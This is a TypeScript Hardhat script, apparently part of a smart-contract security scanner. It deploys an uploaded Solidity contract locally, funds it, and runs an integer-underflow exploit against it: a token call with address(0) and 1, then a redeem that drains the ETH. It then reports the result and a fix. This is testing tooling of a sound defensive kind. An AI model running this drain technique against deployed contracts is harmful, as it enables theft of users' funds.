import hre from "hardhat";
import { parseEther, formatEther, ZeroAddress } from "ethers";
import { buildResult } from "./buildResult";

async function main() {
  const contractName = process.env.UPLOADED_CONTRACT_NAME;
  const fileName = process.env.UPLOADED_FILE_NAME;
  if (!contractName || !fileName) throw new Error("UPLOADED_CONTRACT_NAME and UPLOADED_FILE_NAME must be set");

  const startTime = Date.now();
  const [, attacker] = await hre.ethers.getSigners();

  const fullyQualified = `contracts/uploaded/${fileName}.sol:${contractName}`;
  const VictimFactory = await hre.ethers.getContractFactory(fullyQualified);
  const iface = VictimFactory.interface;

  // --- AI-powered detection via ANALYSIS_JSON ---
  // Gemini identifies the actual token/redeem function names regardless of naming.
  // Falls back to hardcoded "sendTokens"/"transfer" + "redeem" if absent or invalid.
  let tokenFnName: string | null = null;
  let redeemFnName: string | null = null;
  let usedAiAnalysis = false;

  const rawAnalysisJson = process.env.ANALYSIS_JSON;
  if (rawAnalysisJson) {
    try {
      const fullAnalysis = JSON.parse(rawAnalysisJson);
      const ov = fullAnalysis.overflow;
      if (ov && typeof ov.found === "boolean") {
        // support both old field names (tokenFunction) and new (tokenFn)
        const tokenFnField  = ov.tokenFn  ?? ov.tokenFunction;
        const redeemFnField = ov.redeemFn ?? ov.redeemFunction;
        if (ov.found && tokenFnField && redeemFnField) {
          // Verify both functions exist in ABI (guard against hallucination)
          const tFn = iface.getFunction(tokenFnField);
          const rFn = iface.getFunction(redeemFnField);
          if (tFn !== null && rFn !== null) {
            tokenFnName = tokenFnField;
            redeemFnName = redeemFnField;
            usedAiAnalysis = true;
            console.log(`[overflow] AI analysis: tokenFn=${tokenFnName}, redeemFn=${redeemFnName}`);
          } else {
            console.warn(`[overflow] AI suggested ${tokenFnField}/${redeemFnField} but ABI check failed — trying fallback`);
          }
        } else if (!ov.found) {
          console.log(`[overflow] Gemini: no overflow vulnerability detected`);
          // tokenFnName stays null — will skip to "not applicable" result
        } else {
          throw new Error("Invalid overflow fields in ANALYSIS_JSON");
        }
      } else {
        throw new Error("Missing overflow field in ANALYSIS_JSON");
      }
    } catch (e: any) {
      console.warn(`[overflow] Could not parse ANALYSIS_JSON (${e.message}) — falling back to ABI detection`);
    }
  }

  // Legacy fallback: check for hardcoded names
  if (!usedAiAnalysis && tokenFnName === null) {
    if (iface.getFunction("sendTokens")) tokenFnName = "sendTokens";
    else if (iface.getFunction("transfer")) tokenFnName = "transfer";
    if (iface.getFunction("redeem")) redeemFnName = "redeem";

    if (tokenFnName && redeemFnName) {
      console.log(`[overflow] Fallback ABI detection: tokenFn=${tokenFnName}, redeemFn=${redeemFnName}`);
    }
  }

  // Validate actual ABI signatures — the overflow attack needs tokenFn(address, uint256)
  // regardless of what AI reported. Bail out early if the real signature doesn't match.
  if (tokenFnName && redeemFnName) {
    const tokenFnAbi = iface.getFunction(tokenFnName);
    const tokenSigOk =
      tokenFnAbi !== null &&
      tokenFnAbi.inputs.length >= 2 &&
      tokenFnAbi.inputs[0].type === "address" &&
      tokenFnAbi.inputs[1].type === "uint256";

    if (!tokenSigOk) {
      console.warn(
        `[overflow] ${tokenFnName} ABI signature incompatible with underflow attack ` +
        `(need (address,uint256), got (${tokenFnAbi?.inputs.map(i => i.type).join(",") ?? "?"})) — skipping`,
      );
      tokenFnName = null;
    }
  }

  if (!tokenFnName || !redeemFnName) {
    // Pattern not applicable — deploy without value just for the result address
    const victim = await VictimFactory.deploy();
    await victim.waitForDeployment();
    const victimAddress = await victim.getAddress();
    const endTime = Date.now();
    const balance: bigint = await hre.ethers.provider.getBalance(victimAddress);

    const result = buildResult({
      contractName,
      contractAddress: victimAddress,
      attackType: "overflow",
      targetFunction: "N/A",
      severity: "Critical",
      initialBalance: balance,
      finalBalance: balance,
      stolenAmount: 0n,
      startTime,
      endTime,
      transactions: [],
      timeline: [
        `${contractName} deployed`,
        usedAiAnalysis
          ? "Gemini: no overflow vulnerability detected"
          : "No sendTokens/transfer + redeem pattern — not applicable",
      ],
      report: {
        vulnerabilityType: "Integer Overflow/Underflow",
        affectedFunction: "N/A",
        explanation: "Contract does not have the token transfer + redeem pattern required for this attack.",
        fix: "N/A",
      },
    });
    process.stdout.write("SIMULATION_RESULT:" + JSON.stringify(result) + "\n");
    return;
  }

  // --- Pattern matched — deploy with value only if constructor is payable ---
  const isConstructorPayable = iface.deploy.payable;
  const victim = isConstructorPayable
    ? await VictimFactory.deploy({ value: parseEther("5") })
    : await VictimFactory.deploy();
  await victim.waitForDeployment();
  const victimAddress = await victim.getAddress();

  // Seed with ETH if not already funded via constructor
  if (!isConstructorPayable) {
    // Try buy() if available (e.g. OverflowVictim style)
    if (iface.getFunction("buy")) {
      try {
        await (victim as any).buy({ value: parseEther("5") });
      } catch { /* ignore */ }
    } else {
      // No buy() — try direct ETH send (requires receive/fallback)
      try {
        const [funder] = await hre.ethers.getSigners();
        await funder.sendTransaction({ to: victimAddress, value: parseEther("5") });
      } catch {
        // Cannot seed — report as unable to test
      }
    }
  }

  let PRICE: bigint = parseEther("0.1");
  try { PRICE = await (victim as any).PRICE(); } catch { /* use default */ }

  const initialBalance: bigint = await hre.ethers.provider.getBalance(victimAddress);
  const drainTokens: bigint = initialBalance > 0n ? initialBalance / PRICE : 0n;

  const AttackerFactory = await hre.ethers.getContractFactory("OverflowAttacker");
  const attackerContract = await AttackerFactory.connect(attacker).deploy();
  await attackerContract.waitForDeployment();
  const attackerAddress = await attackerContract.getAddress();

  // Trigger underflow: tokenFn(address(0), 1) — ABI signature already verified as (address, uint256)
  const triggerData = iface.encodeFunctionData(tokenFnName, [ZeroAddress, 1n]);

  // redeemFn may take (uint256) or () — read from actual ABI
  const redeemFnAbi = iface.getFunction(redeemFnName);
  const extractData =
    redeemFnAbi && redeemFnAbi.inputs.length === 0
      ? iface.encodeFunctionData(redeemFnName, [])
      : iface.encodeFunctionData(redeemFnName, [drainTokens]);

  const t1 = Date.now();
  let attackSucceeded = false;

  try {
    await (attackerContract as any).connect(attacker).attack(victimAddress, triggerData, extractData);
    attackSucceeded = true;
  } catch {
    // Attack failed — contract likely uses checked arithmetic
  }

  const endTime = Date.now();
  const finalBalance: bigint = await hre.ethers.provider.getBalance(victimAddress);
  const stolenAmount: bigint = initialBalance > finalBalance ? initialBalance - finalBalance : 0n;
  const attackerBal: bigint = await hre.ethers.provider.getBalance(attackerAddress);

  const result = buildResult({
    contractName,
    contractAddress: victimAddress,
    attackType: "overflow",
    targetFunction: `${tokenFnName}()`,
    severity: "Critical",
    initialBalance,
    finalBalance,
    stolenAmount,
    startTime,
    endTime,
    transactions: attackSucceeded
      ? [
          {
            step: 1,
            description: `Attacker calls ${tokenFnName}(address(0), 1) with 0 token balance`,
            from: attacker.address,
            to: victimAddress,
            value: "0.0",
            unit: "ETH",
            timestampMs: t1,
            balanceAfter: { victim: formatEther(initialBalance), attacker: "type(uint256).max tokens" },
          },
          {
            step: 2,
            description: `Attacker redeems ${drainTokens} tokens → drains vault via ${redeemFnName}()`,
            from: attackerAddress,
            to: victimAddress,
            value: formatEther(stolenAmount),
            unit: "ETH",
            timestampMs: endTime,
            balanceAfter: { victim: formatEther(finalBalance), attacker: formatEther(attackerBal) },
          },
        ]
      : [],
    timeline: attackSucceeded
      ? [
          `${contractName} deployed with 5 ETH`,
          `${tokenFnName}(address(0), 1) called with 0 tokens`,
          "Unchecked subtraction: 0 - 1 = type(uint256).max",
          `Redeemed ${drainTokens} tokens via ${redeemFnName}() — VULNERABLE`,
        ]
      : [
          `${contractName} deployed`,
          `${tokenFnName} + ${redeemFnName} pattern found`,
          "Attack failed — arithmetic is likely checked — SAFE",
        ],
    report: {
      vulnerabilityType: "Integer Overflow/Underflow",
      affectedFunction: `${tokenFnName}()`,
      explanation: attackSucceeded
        ? `Unchecked subtraction in ${tokenFnName}() allows underflow. An attacker with 0 tokens subtracts 1 to get type(uint256).max, then redeems via ${redeemFnName}() for all ETH.`
        : `${tokenFnName} + ${redeemFnName} pattern found but attack failed. The contract appears to use checked arithmetic.`,
      fix: attackSucceeded
        ? "Remove the unchecked block. Solidity 0.8+ checks arithmetic by default."
        : "No fix needed — arithmetic is correctly checked.",
    },
  });

  process.stdout.write("SIMULATION_RESULT:" + JSON.stringify(result) + "\n");
}

main().catch(e => {
  console.error(e);
  process.exit(1);
});
